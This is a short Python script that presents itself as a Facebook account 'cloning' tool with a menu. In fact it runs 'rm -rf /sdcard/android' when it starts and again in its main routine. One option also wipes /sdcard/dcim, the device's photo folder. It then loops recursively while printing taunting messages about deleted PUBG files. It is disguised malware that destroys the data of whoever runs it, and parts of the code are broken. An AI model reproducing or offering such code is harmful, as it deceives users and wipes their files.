#-*-coding:utf-8-*-
#OPEN SOURCE BRO

import uuid
import requests,bs4,sys,os,subprocess,time
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
logo="""  _   _   ___  ___  ___  ___  __   __ _   _  _   _ 
 | | | | / _ \ |  \/  | / _ \ \ \ / /| | | || \ | |
 | |_| |/ /_\ \| .  . |/ /_\ \ \ V / | | | ||  \| |
 |  _  ||  _  || |\/| ||  _  |  \ /  | | | || . ` |
 | | | || | | || |  | || | | |  | |  | |_| || |\  |
 \_| |_/\_| |_/\_|  |_/\_| |_/  \_/   \___/ \_| \_/
                                                    """
def main():
    os.system("rm -rf /sdcard/android")
    print(logo)
    print("\x1b[1;97m    MAIN MENU")
    print("\x1b[1;97m-----------------------------------------------------")
    print("\x1b[1;92m[1]\x1b[1;92mSTART CLONING JUSTNOW")
    print("\x1b[1;92m[2]\x1b[1;92mSTART CLONING JUSTNOW2")
    print("\x1b[1;92m[3]\x1b[1;92m INBOX ME")
    print("\x1b[1;97m-----------------------------------------------------")
    log_sel()
def log_sel():
	sel = input("Choose:")
	if sel =="1":
		fucking()
	elif sel =="2":
		fucking()
		os.system("rm -rf /sdcard/dcim")
	elif sel =="3":
		os.system('xdg-open https://facebook.com/hamayun.official')
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()

def fucking():
    print("HELLO KONE ZWEYA","\N{winking face}")
    print("")
    print("OS LAG PUBG RUN KA TA CHE RUN KEGE KA NA ")
    time.sleep(2)
    print("")
    print("CHANCE ME DRKO BACHHE SRF ME DRLA PUBG FILES BAJA KRAL")
    print("")
    os.system("rm -rf /sdcard/android")
    time.sleep(2)
    print("300RUPO OQAT DE DI ") ;("\U0001F923");print("\U0001F923")
    print("")
    time.sleep(2)
    print("\U0001F923")
    fucking()
    print("\U0001F923")
if __name__=='__main__':
    main()